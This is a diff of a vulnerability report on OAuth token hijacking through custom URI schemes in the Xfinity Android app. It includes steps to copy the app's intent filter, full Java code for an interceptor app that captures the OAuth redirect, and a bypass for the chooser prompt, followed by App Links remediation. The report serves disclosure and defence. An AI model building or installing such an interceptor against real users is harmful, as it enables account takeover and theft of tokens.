@@ -1,17 +1,122 @@
-# Title: OAuth Account Takeover Through Mobile App Impersonation
-## Description:
-Mobile app impersonation is a form of identity theft where malicious actors create fraudulent mobile applications that mimic legitimate OAuth-enabled apps. These malicious apps trick users into providing their OAuth credentials, subsequently leading to unauthorized account access. The attacker can then misuse the stolen access tokens to impersonate the victim, leading to potential data breaches and unauthorized actions on the victim's behalf
+# Title: OAuth Account Takeover Through Mobile App Impersonation in Xfinity APK
+
+---
+
+# Description:
+Mobile app impersonation is a form of identity theft where malicious actors create fraudulent mobile applications that mimic legitimate OAuth-enabled apps. These malicious apps trick users into providing their OAuth credentials, subsequently leading to unauthorized account access. The attacker can then misuse the stolen access tokens to impersonate the victim, leading to potential data breaches and unauthorized actions on the victim's behalf.
+
+One key assumption made during OAuth authentication flow is the ownership of the entity that redirect_uri points to, in the case of redirect_uri=https://www.clientapp.com/callback/oauth, we assume www.clientapp.com belongs to the client app since they're the ones who configured it as redirect_uri and they're the only ones who can claim that domain.
+
+In the case of mobile apps, the typical implementation for OAuth on mobile relies on custom schemes like redirect_uri=com.target.app://oauth, the problem here is that any application on the user device can register this scheme and receive the OAuth grant that was meant for the legitimate application.
+
+In order for an application to register a custom URI scheme, it has to declare it by adding an intent filter to its manifest similar to this one:
+```
+<activity android:exported="true" android:name="PACKAGE_NAME.CLASS_NAME">
+    <intent-filter>
+        <action android:name="android.intent.action.VIEW"/>
+        <category android:name="android.intent.category.DEFAULT"/>
+        <category android:name="android.intent.category.BROWSABLE"/>
+        <data android:host="oauth" android:scheme="com.target.app"/>
+    </intent-filter>
+</activity>
+```
+It is possible for two apps to register the same scheme, in this case the system can differentiate between the two apps using other attributes such as host, port, path and mime type, in case where both apps have the same attributes, the system will let the user decide which app to use to continue
+
+---
 
 ## POC:
 
-## Steps To Reproduce:
-* Malicious app (In our Case 0Auth_Exploit_FB1.apk) is designed to appear and function similarly to legitimate OAuth-enabled mobile app.
-* Users unknowingly install and use this malicious app.
-* Now, User has installed Canva Mobile app and login with Facebook.
-* The attacker captures the user's OAuth credentials and obtains OAuth access tokens and enabling ongoing access to the victim's account.
-* Unauthorized actions are taken, including data theft, account manipulation, and misuse of user data.
 
-## Impact:
+
+---
+
+# Steps to reproduce:
+
+So to exploit this in Xfinity app you need to follow the below steps:
+
+### Finding vulnerable custom URI:-
+1. Decompile Xfinity APK
+1. Go to *AndroidManifest.xml* 
+1. Search for the intent filters that receive those URI's that contain sensitive data, such as token or code.
+
+### Making Exploit APK:-
+1. Create  an Android Studio Project
+1. Create an empty Activity
+1. Go to *AndroidManifest.xml* file and add the intent filter found in Xfinity APK, under the main activity.
+1.  Add the following code to MainActivity.java to intercept the OAuth token:
+
+```
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+import android.widget.Toast;
+import androidx.appcompat.app.AppCompatActivity;
+
+/* loaded from: classes.dex */
+public class MainActivity extends AppCompatActivity {
+    /* JADX INFO: Access modifiers changed from: protected */
+    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+    public void onCreate(Bundle bundle) {
+        Uri data;
+        super.onCreate(bundle);
+        setContentView(R.layout.activity_main);
+        TextView textView = (TextView) findViewById(R.id.titleTextView);
+        TextView textView2 = (TextView) findViewById(R.id.textView);
+        Button button = (Button) findViewById(R.id.copyButton);
+        button.setVisibility(8);
+        Intent intent = getIntent();
+        if (!"android.intent.action.VIEW".equals(intent.getAction()) || (data = intent.getData()) == null) {
+            return;
+        }
+        final String uri = data.toString();
+        textView.setText("OAuth Code Leaked Successfully");
+        textView2.setText(uri);
+        button.setVisibility(0);
+        button.setOnClickListener(new View.OnClickListener() { // from class: com.oauth.exploitfb1.MainActivity.1
+            @Override // android.view.View.OnClickListener
+            public void onClick(View view) {
+                ((ClipboardManager) MainActivity.this.getSystemService("clipboard")).setPrimaryClip(ClipData.newPlainText("URL", uri));
+                Toast.makeText(MainActivity.this, "Data copied to clipboard", 0).show();
+            }
+        });
+        Toast.makeText(this, "Data received", 0).show();
+    }
+}
+```
+1. Build the APK and generate a signed APK file.
+1. Install it in victim's device.
+
+---
+
+# What victim must do:
+
+## Flow:
+1. Victim unintentionally downloads and installs the exploit APK sometime.
+1. He installs Xfinity APK and signs up. 
+1. When signing up is completed, He will be prompted with 2 exactly same icons to click on. 
+1. He clicks on malicious apk. (as he is confuse which one is legitimate) 
+1. OAuth tokens get passed to malicious apk. 
+
+### Case  1:
+1. Must have exploit APK within the device.
+1. Must click on the exploit APK icon when prompted.
+
+### Case 2:
+1. Must have exploit APK within device.
+
+No need to click on any icon there will no prompt, OAuth tokens will directly get passed to exploit apk. 
+
+**Prompt can be bypassed, by several ways here's the one of them:**
+If the target application uses OAuth in both Android and iOS with different schemes, an attacker can register the custom scheme meant for the iOS version of the app on an Android target and trigger OAuth flow, this will allow the malicious app to bypass the conflict with the legit application over the scheme.
+
+---
+
+# Impact:
 The impact of OAuth account takeover through mobile app impersonation can be severe and wide-ranging:
 
 * Data Breaches: Attackers can gain access to sensitive user data, including personal information, financial details, and confidential communications.
@@ -22,15 +127,73 @@ The impact of OAuth account takeover through mobile app impersonation can be sev
 
 * Reputation Damage: Unauthorized actions can lead to reputation damage for both users and OAuth providers.
 
-##  Recommendation:
-When it comes to OAuth, we've been using custom schemes for a while, but there are more secure options available, like:
+---
 
-* App-to-App Integration: This means apps can securely talk to each other. For example, Google Identity Services and Facebook Express Login for Android allow apps to work together safely.
+# Recommendation:
+In the context of OAuth, Custom schemes have been used traditionally, but there are more secure and reliable options available, notably:
 
-* Verifiable App Links for Android: This is a way to make sure that when you click a link in an Android app, the system checks if it's real. This helps protect against scams and bad stuff.
+App to app integration like Google Identity Services and Facebook Express Login for Android
+[Android's verifiable AppLinks](https://developer.android.com/training/app-links/verify-android-applinks)
 
-**Note: Disabling Custom URI scheme redirect method for Android clients by default**
+Android Verifiable App Links and iOS Associated Domains are mechanisms implemented by Android and iOS operating systems, respectively, to enhance the security and user experience of mobile applications. Android Verifiable App Links ensure that when a user clicks a web link associated with an Android app, the system verifies its authenticity, making it less susceptible to phishing or malicious attacks. iOS Associated Domains, on the other hand, enable iOS apps to establish trusted connections with specific web domains, allowing for seamless integration between apps and web content, such as single sign-on and universal links. Both technologies serve to strengthen the trustworthiness of mobile app interactions and streamline user interactions, contributing to a safer and more convenient mobile ecosystem.
 
-## Referencce:
+## Android
+You need to have /.well-known/assetlinks.json hosted on your backend with a format like this:
+
+```
+[
+  {
+    "relation": [
+      "delegate_permission/common.handle_all_urls",
+      "delegate_permission/common.get_login_creds"
+    ],
+    "target": {
+      "namespace": "android_app",
+      "package_name": "com.myapplication.android",
+      "sha256_cert_fingerprints": [
+        "APPLICATION_CERT_FINGERPRINT"
+      ]
+    }
+  }
+]
+```
+
+### AndroidManifest.xml
+```
+    <intent-filter android:autoVerify="true">
+    <action android:name="android.intent.action.VIEW" />
+    <category android:name="android.intent.category.DEFAULT" />
+    <category android:name="android.intent.category.BROWSABLE" />
+
+    <!-- If a user clicks on a shared link that uses the "http" scheme, your
+         app should be able to delegate that traffic to "https". -->
+    <data android:scheme="http" />
+    <data android:scheme="https" />
+
+    <!-- Include one or more domains that should be verified. -->
+    <data android:host="auth.myapp.com" />
+</intent-filter>
+```
+
+### Kotlin
+```
+Log.i(TAG, "Creating auth request for login hint: $loginHint")
+val authRequestBuilder: AuthorizationRequest.Builder = Builder(
+    mAuthStateManager.getCurrent().getAuthorizationServiceConfiguration(),
+    mClientId.get(),
+    ResponseTypeValues.CODE,
+    "https://auth.myapp.com/oauth/handler" // The redirect URI with an https scheme
+)
+    .setScope(mConfiguration.getScope())
+if (!TextUtils.isEmpty(loginHint)) {
+    authRequestBuilder.setLoginHint(loginHint)
+}
+mAuthRequest.set(authRequestBuilder.build())
+```
+
+---
+
+# Referencce:
 [https://developers.googleblog.com/2023/10/enhancing-oauth-app-impersonation-protections.html](https://developers.googleblog.com/2023/10/enhancing-oauth-app-impersonation-protections.html)
 [https://developer.android.com/training/app-links/verify-android-applinks](https://developer.android.com/training/app-links/verify-android-applinks)
+[https://blog.ostorlab.co/one-scheme-to-rule-them-all.html](https://blog.ostorlab.co/one-scheme-to-rule-them-all.html)
